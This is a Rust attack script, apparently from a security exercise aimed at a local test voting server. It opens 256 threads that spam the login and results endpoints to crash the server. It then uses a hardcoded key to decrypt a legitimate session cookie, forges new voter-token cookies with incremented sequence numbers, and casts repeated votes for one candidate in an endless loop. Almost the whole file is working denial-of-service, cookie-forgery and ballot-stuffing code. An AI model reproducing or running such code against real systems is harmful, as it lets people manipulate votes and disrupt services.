use reqwest;
use reqwest_cookie_store;
use aes_gcm::aead::{generic_array::GenericArray, Aead, AeadInPlace, KeyInit, Payload};
use aes_gcm::Aes256Gcm;
use ::cookie::{Key, Cookie};
use urlencoding::decode;
use rand::RngCore;
use std::time::Duration;
use url::Url;
use std::thread::{self, JoinHandle};

pub const NONCE_LEN: usize = 12;
pub const TAG_LEN: usize = 16;
pub const KEY_LEN: usize = 32;

#[tokio::main]
async fn main() {
    // force webserver to restart
    crasher();
    //initialize mutable cookie storage
    let jar = reqwest_cookie_store::CookieStore::default();
    let jar = reqwest_cookie_store::CookieStoreMutex::new(jar);
    let jar = std::sync::Arc::new(jar);
    //initialize client with said storage
    let client = reqwest::Client::builder().cookie_provider(std::sync::Arc::clone(&jar)).build().unwrap();
    //log in to server legitimatley
    client.post("http://127.0.0.1:8000/login").form(&[("ssn", "12345"),("password","1234")]).send().await.unwrap();
    //vote legitly to grab cookie
    let mut sequence_num: u32;
    client.post("http://127.0.0.1:8000/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
    {
        let mut decrypted: String = String::from("1");
        let mut store = jar.lock().unwrap();
        for c in store.iter_unexpired() {
        println!("Got cookie {},{}\n", &c.name(),&c.value());
        decrypted = unseal(c.name(),c.value()).unwrap();
        println!("Decrypted value: Name={}, value={}",&c.name(),&decrypted);
        }
        // remove legit cookie from our client
        store.clear();
        // add illegitimate cookie
        sequence_num = decrypted.parse::<u32>().unwrap() + 1;
        let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string()));
        store.insert_raw(&newcookie, &Url::parse("http://127.0.0.1").unwrap()).unwrap();
    }
    println!("Entering endless loop, press ctrl+C to exit.");
    loop{
        let bruh2 = client.post("http://127.0.0.1:8000/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
        {
            let mut store = jar.lock().unwrap();
            if bruh2.text().await.unwrap().contains("Thanks for voting"){
                println!("Voted for gus with sequence number {}",&sequence_num);
                store.clear();
                sequence_num += 1;
                let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string()));
                store.insert_raw(&newcookie, &Url::parse("http://127.0.0.1").unwrap()).unwrap();
            }
        
        }
    }
}

/*Crasher? I hardly Know 'er!
spawns threads to crash webserver by spamming login requests */
fn crasher() {
    let mut crashers: Vec<JoinHandle<()>> = vec!();
    for i in 0..128{
    let a = thread::spawn(move || {
    loop{
        let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(3000)).build().unwrap();
        match client.post("http://127.0.0.1:8000/login").form(&[("ssn", "1"),("password","jalskdjfh43u4halksdflkajsdlfkjasfy2323ADSFLSkasdfasd")]).send(){
            Ok(_) => (),
            Err(e) => {
                println!("crasher thread {} {}",i,e);
                break;
            }
        }
        }
    });
    let b = thread::spawn(move || {
        loop{
            let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(3000)).build().unwrap();
            match client.get("http://127.0.0.1:8000/results").send(){
                Ok(_) => (),
                Err(e) => {
                    println!("crasher thread {} {}",i,e);
                    break;
                }
            }
            } 
    });
    crashers.push(a);
    crashers.push(b);
    }
    for t in crashers.into_iter(){
        t.join().unwrap();
    }
}


// taken from the cookie secure crate
fn unseal(name: &str, value: &str) -> Result<String, &'static str> {
    let key = Key::derive_from(base64::decode("2bChvsu8Ko4rk1jYV5xijcAN5IQVdI+wBdz9lEJRUdY=").unwrap().as_slice());

    // cookie is in URL format which will make base64 throw a fit, decode cookie content
    let cstring = decode(value).expect("utf8").into_owned();
    let data = base64::decode(cstring).map_err(|_| "bad base64 value")?;
    if data.len() <= NONCE_LEN {
        return Err("length of decoded data is <= NONCE_LEN");
    }

    let (nonce, cipher) = data.split_at(NONCE_LEN);
    let payload = Payload { msg: cipher, aad: name.as_bytes() };

    let aead = Aes256Gcm::new(GenericArray::from_slice(key.encryption().try_into().unwrap()));
    aead.decrypt(GenericArray::from_slice(nonce), payload)
        .map_err(|_| "invalid key/nonce/value: bad seal")
        .and_then(|s| String::from_utf8(s).map_err(|_| "bad unsealed utf8"))
}

fn encrypt_cookie(name: &str, value: &str) -> String {
    // Create a vec to hold the [nonce | cookie value | tag].
    let key = Key::derive_from(base64::decode("2bChvsu8Ko4rk1jYV5xijcAN5IQVdI+wBdz9lEJRUdY=").unwrap().as_slice());
    let cookie_val = value.as_bytes();
    let mut data = vec![0; NONCE_LEN + cookie_val.len() + TAG_LEN];

    // Split data into three: nonce, input/output, tag. Copy input.
    let (nonce, in_out) = data.split_at_mut(NONCE_LEN);
    let (in_out, tag) = in_out.split_at_mut(cookie_val.len());
    in_out.copy_from_slice(cookie_val);

    // Fill nonce piece with random data.
    let mut rng = rand::thread_rng();
    rng.try_fill_bytes(nonce).expect("couldn't random fill nonce");
    let nonce = GenericArray::clone_from_slice(nonce);

    // Perform the actual sealing operation, using the cookie's name as
    // associated data to prevent value swapping.
    let aad = name.as_bytes();
    let aead = Aes256Gcm::new(GenericArray::from_slice(key.encryption()));
    let aad_tag = aead.encrypt_in_place_detached(&nonce, aad, in_out)
        .expect("encryption failure!");

    // Copy the tag into the tag piece.
    tag.copy_from_slice(&aad_tag);

    // Base64 encode [nonce | encrypted value | tag].
    base64::encode(&data)
}